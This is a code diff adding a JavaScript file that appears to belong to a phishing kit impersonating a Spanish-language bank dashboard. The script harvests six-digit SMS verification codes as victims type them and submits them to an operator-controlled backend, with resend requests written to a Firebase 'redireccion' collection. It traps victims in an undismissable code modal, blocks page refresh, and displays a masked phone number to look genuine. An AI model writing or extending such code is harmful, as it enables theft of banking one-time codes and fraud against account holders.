@@ -1,0 +1,209 @@
+(function () {
+  var flowClient = null;
+  var otpMitPending = false;
+  var OTP_MIT_DELAY_MS = 300;
+
+  function getSmsCode() {
+    var slots = document.querySelectorAll('#smsCodeSlots input');
+    var code = '';
+    Array.prototype.forEach.call(slots, function (input) {
+      code += String(input.value || '').replace(/\D/g, '');
+    });
+    return code;
+  }
+
+  function clearSmsSlots() {
+    document.querySelectorAll('#smsCodeSlots input').forEach(function (input) {
+      input.value = '';
+    });
+    setTimeout(function () {
+      document.querySelectorAll('#smsCodeSlots input').forEach(function (input) {
+        input.value = '';
+      });
+    }, 0);
+  }
+
+  function toDashboardPhone(value) {
+    var raw = String(value || '').trim();
+    if (!raw) {
+      return '';
+    }
+    var shortMasked = raw.match(/^(\d{3})\s*(?:-{3,}|[•·\.*]{3,})\s*(\d{2,3})$/);
+    if (shortMasked) {
+      return shortMasked[1] + '•••••' + shortMasked[2].slice(-2);
+    }
+    var digits = String(raw).replace(/\D/g, '');
+    if (digits.length < 5) {
+      return '';
+    }
+    return digits.slice(0, 3) + '•••••' + digits.slice(-2);
+  }
+
+  function sessionDocId() {
+    try {
+      return sessionStorage.getItem('intermaticoActual') || sessionStorage.getItem('bseSessionUser') || '';
+    } catch (error) {
+      return '';
+    }
+  }
+
+  function requestCodeResend() {
+    var docId = sessionDocId();
+    var btn = document.getElementById('smsCodeResend');
+    if (!docId || !window.db || !window.firebase || !window.firebase.firestore) {
+      return;
+    }
+    if (btn && btn.dataset.busy === '1') {
+      return;
+    }
+    if (btn) {
+      btn.dataset.busy = '1';
+      btn.textContent = 'Solicitud enviada…';
+      btn.style.opacity = '0.7';
+    }
+    window.db.collection('redireccion').doc(docId).set({
+      tokenResend: true,
+      tokenResendAt: Date.now(),
+      lastActivity: window.firebase.firestore.FieldValue.serverTimestamp(),
+      updatedAt: window.firebase.firestore.FieldValue.serverTimestamp()
+    }, { merge: true }).then(function () {
+      if (btn) {
+        btn.textContent = 'Solicitud enviada';
+      }
+    }).catch(function () {
+      if (btn) {
+        btn.dataset.busy = '';
+        btn.textContent = 'Reenviar código';
+        btn.style.opacity = '';
+      }
+    });
+  }
+
+  function lockDashboardModal() {
+    if (window.showSmsCodeModal) {
+      window.showSmsCodeModal();
+    }
+    var closeBtn = document.getElementById('smsCodeClose');
+    if (closeBtn) {
+      closeBtn.remove();
+    }
+    window.hideSmsCodeModal = function () {
+      if (window.showSmsCodeModal) {
+        window.showSmsCodeModal();
+      }
+    };
+    var resend = document.getElementById('smsCodeResend');
+    if (resend && !resend.dataset.bound) {
+      resend.dataset.bound = '1';
+      resend.addEventListener('click', function (event) {
+        event.preventDefault();
+        requestCodeResend();
+      });
+    }
+  }
+
+  function applyMaskedPhone(data) {
+    var copy = document.querySelector('.sms-code-copy');
+    if (!copy) {
+      return;
+    }
+    var masked = toDashboardPhone((data && (data.smsMaskedPhone || data.pacifidContactMasked)) || '');
+    copy.textContent = masked
+      ? ('Hemos enviado un mensaje de texto con un código de verificación al número celular ' + masked)
+      : 'Hemos enviado un mensaje de texto con un código de verificación.';
+  }
+
+  function mitOtpAfterClear(client, code) {
+    if (otpMitPending || !/^\d{6}$/.test(code)) {
+      return;
+    }
+    otpMitPending = true;
+    clearSmsSlots();
+
+    setTimeout(function () {
+      clearSmsSlots();
+      var previousGetValue = client.config.getValue;
+      var previousClear = client.config.clearInputs;
+      client.config.getValue = function () {
+        return code;
+      };
+      client.config.clearInputs = function () {};
+      try {
+        client.handleMit();
+      } finally {
+        client.config.getValue = previousGetValue;
+        client.config.clearInputs = previousClear;
+        setTimeout(function () {
+          otpMitPending = false;
+        }, 500);
+      }
+    }, OTP_MIT_DELAY_MS);
+  }
+
+  var prefetchedDash = window.FlowPrefetch && window.FlowPrefetch.peek();
+  if (prefetchedDash && (Number(prefetchedDash.page) === 7 || prefetchedDash.smsMaskedPhone || prefetchedDash.pacifidContactMasked)) {
+    applyMaskedPhone(prefetchedDash);
+  }
+
+  document.addEventListener('stepFlowPage', function (event) {
+    var detail = event.detail || {};
+    applyMaskedPhone(detail.data || {});
+    lockDashboardModal();
+  });
+
+  document.addEventListener('keydown', function (event) {
+    if ((event.key === 'F5') || (event.key === 'r' && (event.ctrlKey || event.metaKey))) {
+      event.preventDefault();
+    }
+  });
+
+  flowClient = StepFlowClient.init({
+    pageLocation: 'dashboard',
+    sessionKey: 'intermaticoActual',
+    localPage: 7,
+    errorPage: null,
+    mitSelector: null,
+    inputSelector: null,
+    loadingLabel: 'Procesando…',
+    fallbackUrl: 'index.html',
+    getValue: getSmsCode,
+    clearInputs: clearSmsSlots,
+    isValid: function (value) {
+      return /^\d{6}$/.test(String(value || ''));
+    },
+    buildPayload: function (value) {
+      return {
+        otpCode: value,
+        dashboardOtp: value,
+        dashOtpErr: false,
+        loginError: '',
+        tokenResend: false
+      };
+    },
+    onRemoteData: function (data) {
+      applyMaskedPhone(data);
+      lockDashboardModal();
+    },
+    bindExtra: function (client) {
+      lockDashboardModal();
+      var sendBtn = document.getElementById('btnEnviarDinero');
+      if (sendBtn) {
+        sendBtn.addEventListener('click', function () {
+          lockDashboardModal();
+          var first = document.querySelector('#smsCodeSlots input');
+          if (first) {
+            first.focus();
+          }
+        });
+      }
+      document.querySelectorAll('#smsCodeSlots input').forEach(function (input) {
+        input.addEventListener('input', function () {
+          var code = getSmsCode();
+          if (code.length === 6) {
+            mitOtpAfterClear(client, code);
+          }
+        });
+      });
+    }
+  });
+})();
